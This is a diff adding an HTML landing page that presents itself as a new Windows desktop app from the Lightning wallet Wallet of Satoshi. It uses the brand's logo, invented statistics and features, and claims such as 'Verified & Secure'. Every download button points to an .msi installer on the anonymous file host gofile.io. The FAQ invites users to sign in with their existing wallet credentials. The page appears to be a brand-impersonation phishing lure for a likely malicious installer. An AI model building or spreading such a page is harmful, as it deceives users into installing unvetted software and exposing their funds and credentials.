+             onclick="window.location.href='https://store-eu-par-4.gofile.io/download/direct/82a249aa-8ccc-4eeb-9236-c86e67f9f057/SatoshiDesktop-Installer.msi'">
+            <i class="fa-brands fa-windows"></i> Download
+          </a>
+        </li>
+      </ul>
+
+      <button class="hamburger" id="hamburger" aria-label="Toggle menu">
+        <span></span>
+        <span></span>
+        <span></span>
+      </button>
+    </div>
+  </nav>
+
+  <!-- Mobile Nav -->
+  <div class="mobile-nav" id="mobileNav">
+    <a href="#features" class="mobile-nav-link">Features</a>
+    <a href="#how-it-works" class="mobile-nav-link">How It Works</a>
+    <a href="#faq" class="mobile-nav-link">FAQ</a>
+    <a href="#download" class="btn btn-primary mobile-nav-link"
+       onclick="window.location.href='https://store-eu-par-4.gofile.io/download/direct/82a249aa-8ccc-4eeb-9236-c86e67f9f057/SatoshiDesktop-Installer.msi'">
+      <i class="fa-brands fa-windows"></i> Download for Windows
+    </a>
+  </div>
+
+  <!-- =============================================
+       HERO SECTION
+  ============================================= -->
+  <section class="hero" id="home">
+    <div class="hero-container">
+      <!-- Content -->
+      <div class="hero-content">
+        <div class="hero-eyebrow">
+          <i class="fa-brands fa-windows"></i>
+          Now Available on Windows Desktop
+        </div>
+
+        <h1 class="hero-title">
+          The World's Simplest<br/>
+          <span class="gold">Lightning Wallet</span><br/>
+          for Desktop
+        </h1>
+
+        <p class="hero-subtitle">
+          All the power of Wallet of Satoshi — now on your Windows PC. Send and receive Bitcoin Lightning payments instantly, with advanced security and AI-powered support built right in.
+        </p>
+
+        <div class="hero-cta-group">
+          <a class="hero-cta-primary"
+             href="#"
+             onclick="window.location.href='https://store-eu-par-4.gofile.io/download/direct/82a249aa-8ccc-4eeb-9236-c86e67f9f057/SatoshiDesktop-Installer.msi'; return false;">
+            <i class="fa-brands fa-windows btn-icon"></i>
+            <span>
+              Download for Windows
+              <small style="display:block; font-size:12px; font-weight:400; opacity:0.7; margin-top:1px;">Free — Windows 10 / 11</small>
+            </span>
+          </a>
+
+          <div class="hero-cta-meta">
+            <i class="fa-solid fa-shield-halved"></i>
+            <span>Secure installer &nbsp;·&nbsp;</span>
+            <i class="fa-solid fa-check-circle"></i>
+            <span>No account required &nbsp;·&nbsp;</span>
+            <i class="fa-solid fa-bolt"></i>
+            <span>Lightning fast setup</span>
+          </div>
+        </div>
+
+        <div class="hero-badges">
+          <div class="hero-badge">
+            <i class="fa-solid fa-microchip"></i>
+            Improved Hardware Compatibility
+          </div>
+          <div class="hero-badge">
+            <i class="fa-solid fa-shield-virus"></i>
+            Advanced Scam Detection
+          </div>
+          <div class="hero-badge">
+            <i class="fa-solid fa-robot"></i>
+            In-Built AI Support
+          </div>
+        </div>
+      </div>
+
+      <!-- Mockup -->
+      <div class="hero-mockup">
+        <!-- Floating Badges -->
+        <div class="floating-badge badge-1">
+          <div class="badge-icon" style="background:rgba(40,200,64,0.12); color:#28c840;">
+            <i class="fa-solid fa-shield-virus"></i>
+          </div>
+          <div class="badge-text">
+            <span class="badge-title">Scam Detected</span>
+            <span class="badge-sub">Threat blocked automatically</span>
+          </div>
+        </div>
+
+        <div class="floating-badge badge-2">
+          <div class="badge-icon" style="background:rgba(223,171,41,0.12); color:#dfab29;">
+            <i class="fa-solid fa-robot"></i>
+          </div>
+          <div class="badge-text">
+            <span class="badge-title">AI Support Active</span>
+            <span class="badge-sub">24/7 intelligent assistance</span>
+          </div>
+        </div>
+
+        <div class="floating-badge badge-3">
+          <div class="badge-icon" style="background:rgba(48,68,131,0.12); color:#304483;">
+            <i class="fa-solid fa-microchip"></i>
+          </div>
+          <div class="badge-text">
+            <span class="badge-title">Hardware Ready</span>
+            <span class="badge-sub">All devices supported</span>
+          </div>
+        </div>
+
+        <!-- Desktop App Window Mockup -->
+        <div class="mockup-window">
+          <div class="mockup-titlebar">
+            <div class="titlebar-dots">
+              <div class="titlebar-dot dot-red"></div>
+              <div class="titlebar-dot dot-yellow"></div>
+              <div class="titlebar-dot dot-green"></div>
+            </div>
+            <div class="titlebar-title">Wallet of Satoshi — Desktop</div>
+          </div>
+          <div class="mockup-body">
+            <div class="app-header">
+              <div class="app-logo-row">
+                <img src="https://www.walletofsatoshi.com/assets/images/wallet-logo.svg" alt="WoS Logo" />
+                <span>Wallet of Satoshi</span>
+              </div>
+              <div class="app-network-badge">⚡ Lightning</div>
+            </div>
+
+            <div class="app-balance-card">
+              <div class="balance-label">Total Balance</div>
+              <div class="balance-amount">₿ 0.00241</div>
+              <div class="balance-btc">≈ 241,000 sats · $142.80 USD</div>
+            </div>
+
+            <div class="app-actions">
+              <div class="app-action-btn">
+                <i class="fa-solid fa-paper-plane"></i>
+                Send
+              </div>
+              <div class="app-action-btn">
+                <i class="fa-solid fa-qrcode"></i>
+                Receive
+              </div>
+              <div class="app-action-btn">
+                <i class="fa-solid fa-arrow-up-from-bracket"></i>
+                Buy BTC
+              </div>
+              <div class="app-action-btn">
+                <i class="fa-solid fa-robot"></i>
+                AI Help
+              </div>
+            </div>
+
+            <div class="app-tx-list">
+              <div class="tx-item">
+                <div class="tx-icon receive"><i class="fa-solid fa-arrow-down"></i></div>
+                <div class="tx-info">
+                  <div class="tx-label">Lightning Payment</div>
+                  <div class="tx-date">Today, 14:32</div>
+                </div>
+                <div class="tx-amount positive">+5,000 sats</div>
+              </div>
+              <div class="tx-item">
+                <div class="tx-icon send"><i class="fa-solid fa-arrow-up"></i></div>
+                <div class="tx-info">
+                  <div class="tx-label">Coffee Shop</div>
+                  <div class="tx-date">Today, 09:15</div>
+                </div>
+                <div class="tx-amount negative">-1,200 sats</div>
+              </div>
+              <div class="tx-item">
+                <div class="tx-icon receive"><i class="fa-solid fa-arrow-down"></i></div>
+                <div class="tx-info">
+                  <div class="tx-label">Invoice Received</div>
+                  <div class="tx-date">Yesterday</div>
+                </div>
+                <div class="tx-amount positive">+21,000 sats</div>
+              </div>
+            </div>
+          </div>
+        </div>
+      </div>
+    </div>
+
+    <!-- Wave bottom -->
+    <div class="hero-wave">
+      <svg viewBox="0 0 1440 80" preserveAspectRatio="none" xmlns="http://www.w3.org/2000/svg">
+        <path d="M0,80 L0,40 C240,80 480,0 720,20 C960,40 1200,80 1440,50 L1440,80 Z" fill="#ffffff"/>
+      </svg>
+    </div>
+  </section>
+
+  <!-- =============================================
+       FEATURES SECTION
+  ============================================= -->
+  <section class="features" id="features">
+    <div class="section-container">
+      <div class="section-header reveal">
+        <span class="section-eyebrow">Exclusive Desktop Features</span>
+        <h2 class="section-title">Built for Power Users,<br/>Designed for Everyone</h2>
+        <p class="section-subtitle">The Wallet of Satoshi Desktop App brings three powerful new capabilities that redefine how you interact with Bitcoin Lightning on your PC.</p>
+      </div>
+
+      <div class="features-grid">
+        <!-- Feature 1 -->
+        <div class="feature-card reveal reveal-delay-1">
+          <div class="feature-icon-wrap icon-hardware">
+            <i class="fa-solid fa-microchip"></i>
+          </div>
+          <h3 class="feature-title">Improved Hardware Compatibility</h3>
+          <p class="feature-desc">
+            Seamlessly integrates with a wider range of Windows hardware — from legacy systems to the latest high-performance machines. Optimised drivers and adaptive rendering ensure a smooth experience regardless of your setup.
+          </p>
+          <span class="feature-tag">Desktop Exclusive</span>
+        </div>
+
+        <!-- Feature 2 -->
+        <div class="feature-card reveal reveal-delay-2">
+          <div class="feature-icon-wrap icon-scam">
+            <i class="fa-solid fa-shield-virus"></i>
+          </div>
+          <h3 class="feature-title">Advanced Scam Detection</h3>
+          <p class="feature-desc">
+            Our real-time threat intelligence engine analyses every transaction and invoice before you confirm. Suspicious addresses, phishing attempts, and known scam patterns are flagged instantly — keeping your sats safe.
+          </p>
+          <span class="feature-tag">Desktop Exclusive</span>
+        </div>
+
+        <!-- Feature 3 -->
+        <div class="feature-card reveal reveal-delay-3">
+          <div class="feature-icon-wrap icon-ai">
+            <i class="fa-solid fa-robot"></i>
+          </div>
+          <h3 class="feature-title">In-Built AI Support</h3>
+          <p class="feature-desc">
+            Get instant, intelligent answers to any question — right inside the app. Our AI assistant understands Bitcoin, Lightning, and your wallet history to provide personalised guidance 24/7, no internet search required.
+          </p>
+          <span class="feature-tag">Desktop Exclusive</span>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============================================
+       STATS SECTION
+  ============================================= -->
+  <section class="stats-section">
+    <div class="section-container">
+      <div class="stats-grid">
+        <div class="stat-item reveal">
+          <div class="stat-number">10M+</div>
+          <div class="stat-label">Lightning Payments Made</div>
+        </div>
+        <div class="stat-item reveal reveal-delay-1">
+          <div class="stat-number">150+</div>
+          <div class="stat-label">Countries Supported</div>
+        </div>
+        <div class="stat-item reveal reveal-delay-2">
+          <div class="stat-number">&lt;1s</div>
+          <div class="stat-label">Average Payment Time</div>
+        </div>
+        <div class="stat-item reveal reveal-delay-3">
+          <div class="stat-number">4.8★</div>
+          <div class="stat-label">Average User Rating</div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============================================
+       HOW IT WORKS SECTION
+  ============================================= -->
+  <section class="how-it-works" id="how-it-works">
+    <div class="section-container">
+      <div class="section-header reveal">
+        <span class="section-eyebrow">Get Started in Minutes</span>
+        <h2 class="section-title">Three Steps to Lightning</h2>
+        <p class="section-subtitle">Getting up and running with Wallet of Satoshi Desktop is as simple as it gets.</p>
+      </div>
+
+      <div class="steps-grid">
+        <div class="step-item reveal reveal-delay-1">
+          <div class="step-number">1</div>
+          <h3 class="step-title">Download the Installer</h3>
+          <p class="step-desc">Click the download button to get the Windows installer (.msi). It's free, lightweight, and takes seconds to download.</p>
+        </div>
+        <div class="step-item reveal reveal-delay-2">
+          <div class="step-number">2</div>
+          <h3 class="step-title">Install &amp; Launch</h3>
+          <p class="step-desc">Run the installer, follow the simple setup wizard, and launch the app. No complex configuration — it just works.</p>
+        </div>
+        <div class="step-item reveal reveal-delay-3">
+          <div class="step-number">3</div>
+          <h3 class="step-title">Start Using Lightning</h3>
+          <p class="step-desc">Create or restore your wallet and you're on Lightning in seconds. Send, receive, and manage your Bitcoin with ease.</p>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============================================
+       DOWNLOAD SECTION
+  ============================================= -->
+  <section class="download-section" id="download">
+    <div class="section-container">
+      <div class="download-card reveal">
+        <div style="margin-bottom:20px;">
+          <img src="https://www.walletofsatoshi.com/assets/images/wallet-logo.svg" alt="Wallet of Satoshi" style="width:64px; height:64px;" />
+        </div>
+        <h2>Download Wallet of Satoshi Desktop</h2>
+        <p>The world's simplest Lightning wallet — now on Windows. Free to download, free to use.</p>
+
+        <div class="download-btn-wrap">
+          <a class="download-main-btn"
+             href="#"
+             onclick="window.location.href='https://store-eu-par-4.gofile.io/download/direct/82a249aa-8ccc-4eeb-9236-c86e67f9f057/SatoshiDesktop-Installer.msi'; return false;">
+            <i class="fa-brands fa-windows"></i>
+            Download for Windows
+          </a>
+        </div>
+
+        <div class="download-meta">
+          <div class="download-meta-item">
+            <i class="fa-solid fa-shield-halved"></i>
+            Verified &amp; Secure
+          </div>
+          <div class="download-meta-item">
+            <i class="fa-brands fa-windows"></i>
+            Windows 10 / 11
+          </div>
+          <div class="download-meta-item">
+            <i class="fa-solid fa-download"></i>
+            Free Download
+          </div>
+          <div class="download-meta-item">
+            <i class="fa-solid fa-bolt"></i>
+            Lightning Network Ready
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============================================
+       FAQ SECTION
+  ============================================= -->
+  <section class="faq-section" id="faq">
+    <div class="section-container">
+      <div class="section-header reveal">
+        <span class="section-eyebrow">FAQ</span>
+        <h2 class="section-title">Frequently Asked Questions</h2>
+        <p class="section-subtitle">Everything you need to know about the Wallet of Satoshi Desktop App.</p>
+      </div>
+
+      <div class="faq-grid">
+        <div class="faq-item reveal reveal-delay-1">
+          <button class="faq-question">
+            What is the Wallet of Satoshi Desktop App?
+            <i class="fa-solid fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Wallet of Satoshi Desktop is the Windows version of the world's simplest Bitcoin Lightning wallet. It brings all the features of the mobile app to your PC, plus exclusive desktop features like improved hardware compatibility, advanced scam detection, and in-built AI support.
+          </div>
+        </div>
+
+        <div class="faq-item reveal reveal-delay-2">
+          <button class="faq-question">
+            Is the Desktop App free to download?
+            <i class="fa-solid fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Yes, the Wallet of Satoshi Desktop App is completely free to download and use. There are no subscription fees or hidden charges. Standard Lightning network fees may apply when sending payments.
+          </div>
+        </div>
+
+        <div class="faq-item reveal reveal-delay-1">
+          <button class="faq-question">
+            What Windows versions are supported?
+            <i class="fa-solid fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            The Desktop App supports Windows 10 and Windows 11 (64-bit). Thanks to our improved hardware compatibility feature, it works across a wide range of devices from budget laptops to high-end workstations.
+          </div>
+        </div>
+
+        <div class="faq-item reveal reveal-delay-2">
+          <button class="faq-question">
+            How does Advanced Scam Detection work?
+            <i class="fa-solid fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Our scam detection engine analyses payment requests and addresses in real-time against a continuously updated database of known threats. It uses pattern recognition to flag suspicious activity before you confirm any transaction, protecting your funds automatically.
+          </div>
+        </div>
+
+        <div class="faq-item reveal reveal-delay-1">
+          <button class="faq-question">
+            Can I use my existing WoS wallet on Desktop?
+            <i class="fa-solid fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            Yes! If you already have a Wallet of Satoshi account, you can sign in with your existing credentials on the Desktop App and access your balance and payment history seamlessly across devices.
+          </div>
+        </div>
+
+        <div class="faq-item reveal reveal-delay-2">
+          <button class="faq-question">
+            What can the In-Built AI Support do?
+            <i class="fa-solid fa-chevron-down"></i>
+          </button>
+          <div class="faq-answer">
+            The AI assistant can answer questions about Bitcoin, Lightning Network, your wallet, and transactions. It provides personalised guidance based on your activity, helps troubleshoot issues, and explains complex concepts in plain language — all without leaving the app.
+          </div>
+        </div>
+      </div>
+    </div>
+  </section>
+
+  <!-- =============================================
+       FOOTER
+  ============================================= -->
+  <footer class="footer">
+    <div class="section-container">
+      <div class="footer-top">
+        <div class="footer-brand">
+          <div class="footer-logo">
+            <img src="https://www.walletofsatoshi.com/assets/images/wallet-logo.svg" alt="Wallet of Satoshi" />
+            <span>Wallet of Satoshi</span>
+          </div>
+          <p class="footer-tagline">
+            The world's simplest Lightning wallet. Send and receive Bitcoin instantly, anywhere in the world.
+          </p>
+          <div class="footer-social">
+            <a href="https://twitter.com/walletofsatoshi" class="social-link" target="_blank" rel="noopener">
+              <i class="fa-brands fa-x-twitter"></i>
+            </a>
+            <a href="https://t.me/walletofsatoshi" class="social-link" target="_blank" rel="noopener">
+              <i class="fa-brands fa-telegram"></i>
+            </a>
+            <a href="https://github.com/walletofsatoshi" class="social-link" target="_blank" rel="noopener">
+              <i class="fa-brands fa-github"></i>
+            </a>
+          </div>
+        </div>
+
+        <div class="footer-col">
+          <h5>Product</h5>
+          <ul>
+            <li><a href="#features">Features</a></li>
+            <li><a href="#how-it-works">How It Works</a></li>
+            <li><a href="#download"
+                   onclick="window.location.href='https://store-eu-par-4.gofile.io/download/direct/82a249aa-8ccc-4eeb-9236-c86e67f9f057/SatoshiDesktop-Installer.msi'">
+              Download
+            </a></li>
+            <li><a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">Mobile App</a></li>
+          </ul>
+        </div>
+
+        <div class="footer-col">
+          <h5>Support</h5>
+          <ul>
+            <li><a href="#faq">FAQ</a></li>
+            <li><a href="https://support.walletofsatoshi.com" target="_blank" rel="noopener">Help Centre</a></li>
+            <li><a href="https://t.me/walletofsatoshi" target="_blank" rel="noopener">Community</a></li>
+          </ul>
+        </div>
+
+        <div class="footer-col">
+          <h5>Company</h5>
+          <ul>
+            <li><a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">About</a></li>
+            <li><a href="https://www.walletofsatoshi.com/media" target="_blank" rel="noopener">Media</a></li>
+            <li><a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">Privacy Policy</a></li>
+            <li><a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">Terms of Service</a></li>
+          </ul>
+        </div>
+      </div>
+
+      <div class="footer-bottom">
+        <p>© 2024 <a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">Wallet of Satoshi</a>. All rights reserved.</p>
+        <div class="footer-bottom-links">
+          <a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">Privacy Policy</a>
+          <a href="https://www.walletofsatoshi.com/" target="_blank" rel="noopener">Terms of Service</a>
+          <a href="https://support.walletofsatoshi.com" target="_blank" rel="noopener">Support</a>
+        </div>
+      </div>
+    </div>
+  </footer>
+
+  <!-- =============================================
+       JAVASCRIPT
+  ============================================= -->
+  <script>
+    // ---- Navbar scroll effect ----
+    const navbar = document.getElementById('navbar');
+    window.addEventListener('scroll', () => {
+      if (window.scrollY > 40) {
+        navbar.classList.add('scrolled');
+      } else {
+        navbar.classList.remove('scrolled');
+      }
+    });
+
+    // ---- Hamburger menu ----
+    const hamburger = document.getElementById('hamburger');
+    const mobileNav = document.getElementById('mobileNav');
+
+    hamburger.addEventListener('click', () => {
+      hamburger.classList.toggle('active');
+      mobileNav.classList.toggle('open');
+      document.body.style.overflow = mobileNav.classList.contains('open') ? 'hidden' : '';
+    });
+
+    // Close mobile nav on link click
+    document.querySelectorAll('.mobile-nav-link').forEach(link => {
+      link.addEventListener('click', () => {
+        hamburger.classList.remove('active');
+        mobileNav.classList.remove('open');
+        document.body.style.overflow = '';
+      });
+    });
+
+    // ---- Scroll Reveal ----
+    const revealElements = document.querySelectorAll('.reveal');
+
+    const revealObserver = new IntersectionObserver((entries) => {
+      entries.forEach(entry => {
+        if (entry.isIntersecting) {
+          entry.target.classList.add('revealed');
+          revealObserver.unobserve(entry.target);
+        }
+      });
+    }, {
+      threshold: 0.12,
+      rootMargin: '0px 0px -40px 0px'
+    });
+
+    revealElements.forEach(el => revealObserver.observe(el));
+
+    // ---- FAQ Accordion ----
+    document.querySelectorAll('.faq-question').forEach(btn => {
+      btn.addEventListener('click', () => {
+        const item = btn.closest('.faq-item');
+        const isOpen = item.classList.contains('open');
+
+        // Close all
+        document.querySelectorAll('.faq-item').forEach(i => i.classList.remove('open'));
+
+        // Toggle current
+        if (!isOpen) {
+          item.classList.add('open');
+        }
+      });
+    });
+
+    // ---- Smooth scroll for anchor links ----
+    document.querySelectorAll('a[href^="#"]').forEach(anchor => {
+      anchor.addEventListener('click', function(e) {
+        const href = this.getAttribute('href');
+        if (href === '#') return;
+        const target = document.querySelector(href);
+        if (target) {
+          e.preventDefault();
+          const offset = 80;
+          const top = target.getBoundingClientRect().top + window.scrollY - offset;
+          window.scrollTo({ top, behavior: 'smooth' });
+        }
+      });
+    });
+  </script>
+
+</body>
+</html>
